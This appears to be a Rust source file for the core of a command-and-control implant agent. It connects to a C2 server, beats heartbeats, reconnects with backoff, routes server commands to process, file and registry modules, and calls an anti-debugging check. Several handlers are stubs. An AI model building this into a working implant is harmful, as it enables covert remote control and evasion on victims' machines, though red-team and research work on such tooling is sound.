use agent_hardening::anti_debug;
use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
use protocol::messages::{Command, Response};
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time;

/// Configuration for agent connection and reconnection.
#[derive(Clone)]
pub struct ConnectionConfig {
    /// Address of the C2 server (e.g., "127.0.0.1:9000").
    pub server_addr: String,
    /// Interval between heartbeats in seconds (default: 30).
    pub heartbeat_interval: u64,
    /// Initial backoff delay in seconds on reconnect (default: 1).
    pub reconnect_base_delay: u64,
    /// Maximum backoff delay in seconds (default: 300 / 5 minutes).
    pub reconnect_max_delay: u64,
    /// Multiplier applied after each failed reconnect attempt (default: 2).
    pub reconnect_multiplier: f64,
}

impl Default for ConnectionConfig {
    fn default() -> Self {
        Self {
            server_addr: "127.0.0.1:9000".to_string(),
            heartbeat_interval: 30,
            reconnect_base_delay: 1,
            reconnect_max_delay: 300,
            reconnect_multiplier: 2.0,
        }
    }
}

pub struct AgentCore {
    pub id: u32,
    pub config: ConnectionConfig,
}

impl AgentCore {
    #[must_use]
    pub fn new(id: u32) -> Self {
        Self {
            id,
            config: ConnectionConfig::default(),
        }
    }

    /// Create an agent with a custom connection configuration.
    #[must_use]
    pub fn with_config(id: u32, config: ConnectionConfig) -> Self {
        Self { id, config }
    }

    /// Run the agent loop: connect to C2, send heartbeats, and reconnect on failure.
    ///
    /// This is the main entry point for the agent. It retries with exponential
    /// backoff until the connection is established, then runs the heartbeat loop.
    pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        loop {
            match self.connect_and_run_heartbeats().await {
                Ok(()) => {
                    log::info!("Agent {} disconnected cleanly", self.id);
                }
                Err(e) => {
                    log::error!("Agent {} connection error: {e}", self.id);
                }
            }

            // Reconnect with exponential backoff
            let mut delay = self.config.reconnect_base_delay;
            loop {
                log::info!(
                    "Agent {} reconnecting in {delay}s (max {}s)",
                    self.id,
                    self.config.reconnect_max_delay
                );
                time::sleep(Duration::from_secs(delay)).await;

                match TcpStream::connect(&self.config.server_addr).await {
                    Ok(_stream) => {
                        log::info!("Agent {} reconnected to {}", self.id, self.config.server_addr);
                        break;
                    }
                    Err(e) => {
                        log::warn!(
                            "Agent {} reconnect failed: {e} (will retry in {delay}s)",
                            self.id
                        );
                        delay = (delay as f64 * self.config.reconnect_multiplier).ceil() as u64;
                        if delay > self.config.reconnect_max_delay {
                            delay = self.config.reconnect_max_delay;
                        }
                    }
                }
            }
        }
    }

    /// Connect to the C2 server and run the heartbeat loop.
    async fn connect_and_run_heartbeats(&self) -> Result<(), Box<dyn std::error::Error>> {
        let _stream = TcpStream::connect(&self.config.server_addr).await?;
        log::info!("Agent {} connected to {}", self.id, self.config.server_addr);

        self.run_heartbeat_loop().await
    }

    /// Send heartbeats to the C2 server at the configured interval.
    async fn run_heartbeat_loop(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut interval = time::interval(Duration::from_secs(self.config.heartbeat_interval));
        interval.tick().await; // skip the first immediate tick

        loop {
            interval.tick().await;
            let response = self.heartbeat().await;
            log::info!("Agent {} heartbeat: {response:?}", self.id);
        }
    }

    /// Handle an incoming command from the C2 server.
    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        if anti_debug::is_being_debugged() {
            log::warn!("Agent is being debugged");
        }

        match cmd {
            cmd_ref @ Command::Execute { cmd } => {
                if cmd.starts_with("proc:") {
                    process_manager::execute(cmd_ref).await
                } else if cmd.starts_with("file:") {
                    file_manager::execute(cmd_ref).await
                } else if cmd.starts_with("reg:") {
                    registry_manager::execute(cmd_ref).await
                } else {
                    process_manager::execute(cmd_ref).await
                }
            }
            Command::GetSysInfo => monitoring::get_sysinfo().await,
            Command::Heartbeat => Some(Response::Success),
            _ => None,
        }
    }

    /// Generate a heartbeat response.
    pub async fn heartbeat(&self) -> Response {
        // In a production agent this would send a serialised heartbeat packet
        // over the TCP stream. For now it returns a success response.
        Response::Success
    }
}

#[cfg(test)]
mod tests {
    use super::AgentCore;
    use protocol::messages::{Command, Response};

    #[tokio::test]
    async fn execute_commands_return_module_status() {
        let agent = AgentCore::new(1);
        let response = agent
            .handle_command(&Command::Execute {
                cmd: "proc:request".to_string(),
            })
            .await;

        assert_eq!(
            response,
            Some(Response::Failure {
                error: "process management is not implemented".to_string(),
            })
        );
    }

    #[tokio::test]
    async fn heartbeat_returns_success() {
        let agent = AgentCore::new(1);
        let response = agent.heartbeat().await;
        assert_eq!(response, Response::Success);
    }

    #[test]
    fn default_config_has_reasonable_values() {
        let config = super::ConnectionConfig::default();
        assert_eq!(config.heartbeat_interval, 30);
        assert_eq!(config.reconnect_base_delay, 1);
        assert_eq!(config.reconnect_max_delay, 300);
        assert!((config.reconnect_multiplier - 2.0).abs() < 0.01);
    }
}
